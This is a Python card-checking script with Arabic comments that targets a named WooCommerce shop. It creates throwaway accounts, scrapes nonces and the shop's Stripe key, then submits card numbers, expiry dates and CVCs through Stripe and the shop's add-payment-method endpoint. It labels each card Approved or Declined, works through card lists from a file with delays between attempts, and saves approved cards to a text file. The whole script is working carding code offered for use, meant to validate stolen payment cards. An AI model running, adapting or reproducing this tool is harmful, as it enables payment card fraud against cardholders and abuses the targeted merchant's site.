import requests
import re
import random
import string
import uuid
import time
import json
from user_agent import generate_user_agent

# ===== إعدادات الوقت =====
WAIT_TIME = 25  # وقت الانتظار بين البطاقات (بالثواني)
RANDOM_WAIT = False  # إيقاف الانتظار العشوائي

def get_wait_time():
    """حساب وقت الانتظار"""
    if RANDOM_WAIT:
        return random.randint(15, 35)
    return WAIT_TIME

def Stripe1(card_data, site_url):
    """
    فحص بطاقة على موقع يستخدم Stripe
    """
    try:
        card_data = card_data.strip()
        n = card_data.split("|")[0]
        mm = card_data.split("|")[1]
        yy = card_data.split("|")[2]
        cvc = card_data.split("|")[3].strip()

        if "20" in yy:
            yy = yy.split("20")[1]
        if len(yy) == 2:
            yy_full = f"20{yy}"
        else:
            yy_full = yy

        n = n.replace(" ", "")

        user = generate_user_agent()
        r = requests.Session()
        site_url = site_url.rstrip('/')

        print("\n" + "="*60)
        print(f"🔥 فحص: {n[:4]}...|{mm}|{yy}|{cvc}")
        print("="*60)

        # ===== 1. فتح صفحة الحساب =====
        print("\n[1/6] فتح صفحة الحساب...")
        headers = {
            'authority': site_url.replace('https://', '').replace('http://', ''),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': f'{site_url}/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.get(f'{site_url}/my-account/', headers=headers)
        print(f"    ✅ HTTP {response.status_code}")

        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
        if not reg:
            return 'Register nonce not found ❌'
        reg = reg.group(1)
        print(f"    🔑 Register nonce: {reg}")

        # ===== 2. تسجيل حساب جديد =====
        print("\n[2/6] تسجيل حساب جديد...")
        headers = {
            'authority': site_url.replace('https://', '').replace('http://', ''),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site_url,
            'referer': f'{site_url}/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        email = f"u_{uuid.uuid4().hex[:8]}@gmail.com"
        username = f"u_{uuid.uuid4().hex[:8]}"
        password = f"P_{uuid.uuid4().hex[:8]}!"
        print(f"    📧 {email}")
        print(f"    🔑 {password}")

        data = {
            'username': username,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        r.post(f'{site_url}/my-account/', cookies=r.cookies, headers=headers, data=data)
        print("    ✅ تم التسجيل")

        # ===== 3. فتح صفحة إضافة البطاقة =====
        print("\n[3/6] فتح صفحة إضافة البطاقة...")
        headers = {
            'authority': site_url.replace('https://', '').replace('http://', ''),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': f'{site_url}/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        response = r.get(f'{site_url}/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
        print(f"    ✅ HTTP {response.status_code}")

        # استخراج pk_live
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text)
        if not pk_live:
            pk_live = re.search(r'(pk_test_[A-Za-z0-9_-]+)', response.text)
        if not pk_live:
            return 'Stripe key not found ❌'
        pk_live = pk_live.group(1)
        print(f"    🔑 pk_live found")

        # استخراج nonce
        addnonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text)
        if not addnonce:
            addnonce = re.search(r'"createSetupIntentNonce":"(.*?)"', response.text)
        if not addnonce:
            all_nonces = re.findall(r'nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', response.text)
            if all_nonces:
                addnonce = all_nonces[0]
                print(f"    🔑 Using first nonce: {addnonce}")
            else:
                return 'Nonce not found ❌'
        else:
            addnonce = addnonce.group(1)
            print(f"    🔑 AJAX nonce: {addnonce}")

        # استخراج stripe_account
        stripe_account = re.search(r'(acct_[A-Za-z0-9_-]+)', response.text)
        acct = f'&_stripe_account={stripe_account.group(1)}' if stripe_account else ''
        if stripe_account:
            print(f"    🔑 stripe_account: {stripe_account.group(1)}")

        # ===== 4. جلب معرفات Stripe =====
        print("\n[4/6] جلب معرفات Stripe...")
        headers = {
            'authority': 'm.stripe.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://m.stripe.network',
            'referer': 'https://m.stripe.network/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        response = r.post('https://m.stripe.com/6', cookies=r.cookies, headers=headers, data='')
        detet = response.json()
        guid = detet.get('guid', str(uuid.uuid4()))
        muid = detet.get('muid', str(uuid.uuid4()))
        sid = detet.get('sid', str(uuid.uuid4()))
        print(f"    ✅ GUID, MUID, SID obtained")

        client_session_id = str(uuid.uuid4())
        elements_session_config_id = str(uuid.uuid4())
        times = random.randint(10000, 99999)

        # ===== 5. إنشاء Payment Method =====
        print("\n[5/6] إنشاء Payment Method...")
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_full}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10090&billing_details[address][country]=US&billing_details[name]=+&billing_details[email]={email}&payment_user_agent=stripe.js%2F8da149ee39%3B+stripe-js-v3%2F8da149ee39%3B+payment-element%3B+deferred-intent&referrer={site_url}&time_on_page={times}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_live}{acct}&_stripe_version=2024-06-20'

        response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        if 'id' not in response.json():
            error_msg = response.json().get('error', {}).get('message', 'Unknown error')
            return f'Payment method creation failed: {error_msg} ❌'
        payment_id = response.json()['id']
        print(f"    ✅ Payment Method: {payment_id}")

        # ===== 6. تأكيد Setup Intent =====
        print("\n[6/6] تأكيد Setup Intent...")
        headers = {
            'authority': site_url.replace('https://', '').replace('http://', ''),
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': site_url,
            'referer': f'{site_url}/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        # تجربة actions مختلفة
        actions = ['create_setup_intent', 'wc_stripe_create_and_confirm_setup_intent']
        text = ''

        for action in actions:
            print(f"    🔄 Trying action: {action}")

            if action == 'create_setup_intent':
                data = {
                    'action': action,
                    'wcpay-payment-method': payment_id,
                    '_ajax_nonce': addnonce,
                    'wcpay-fraud-prevention-token': '',
                }
            else:
                data = {
                    'action': action,
                    'wc-stripe-payment-method': payment_id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': addnonce,
                }

            response = r.post(f'{site_url}/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
            text = response.text

            if text != '0' and 'error' not in text.lower():
                print(f"    ✅ Action '{action}' succeeded")
                break
            else:
                print(f"    ❌ Action '{action}' failed")

        print("\n" + "="*60)
        print(f"📄 Response: {text[:200]}")
        print("="*60)

        # ===== تحليل النتيجة =====
        try:
            json_res = json.loads(text)
            if json_res.get('success') == True:
                result = 'Approved ✅'
            else:
                error_msg = json_res.get('data', {}).get('error', {}).get('message', 'Unknown error')
                if 'declined' in error_msg.lower() or 'not able to add' in error_msg.lower():
                    result = 'Declined ❌'
                elif 'incorrect' in error_msg.lower():
                    result = 'Card number is incorrect ❌'
                elif 'duplicate' in error_msg.lower():
                    result = 'Approved (Duplicate) ✅'
                else:
                    result = f'Declined ❌: {error_msg}'
        except:
            if 'card was declined' in text.lower() or 'Your card could not be set up' in text:
                result = 'The card was declined ❌'
            elif 'Your card number is incorrect.' in text:
                result = 'Card number is incorrect ❌'
            elif 'success' in text.lower() or '"success":true' in text:
                result = 'Approved ✅'
            elif 'duplicate' in text.lower():
                result = 'Approved (Duplicate) ✅'
            elif text == '0':
                result = 'Nonce expired or invalid ❌'
            else:
                result = f'Unknown: {text[:50]}'

        print(f"\n📊 النتيجة: {result}")

        # ===== ⏱️ وقت الانتظار بين البطاقات =====
        wait_time = get_wait_time()
        print(f"[⏱️] انتظار {wait_time} ثانية قبل البطاقة التالية...")
        time.sleep(wait_time)

        return result

    except Exception as e:
        return f'❌ {str(e)}'


if __name__ == '__main__':
    Getat = 'Stripe Auth - https://simplesympathy.com'
    print(f'Checker {Getat}')
    print("="*60)
    print(f"⏱️ وقت الانتظار بين البطاقات: {WAIT_TIME} ثانية")
    print("="*60)

    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')

    if Br == '1':
        try:
            while True:
                ar = input('\nEnter Card (n|mm|yy|cvc): ')
                if not ar:
                    continue
                resulti = Stripe1(ar, "https://simplesympathy.com")
                if 'Approved' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(ar + f': {resulti} > {Getat}\n')
                print(f'Response: {resulti}')
        except KeyboardInterrupt:
            print('\n🛑 تم الإيقاف بواسطة المستخدم')
        except Exception as e:
            print(f'Error - {e}')
            time.sleep(2)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        try:
            with open(cr, "r") as f:
                crads = f.read().splitlines()
                print(f'⏱️ وقت الانتظار: {WAIT_TIME} ثانية بين كل بطاقة\n')
                for P in crads:
                    noy += 1
                    try:
                        resulti = Stripe1(P, "https://simplesympathy.com")
                    except Exception as e:
                        resulti = f'Error {e}'
                    if 'Approved' in resulti:
                        with open('Approved Card.txt', "a") as f:
                            f.write(P + f': {resulti} > {Getat}\n')
                    print(f'[{noy}] {P} >> {resulti}')
        except FileNotFoundError:
            print(f'❌ ملف {cr} غير موجود!')
        except Exception as e:
            print(f'Error - {e}')
            time.sleep(2)
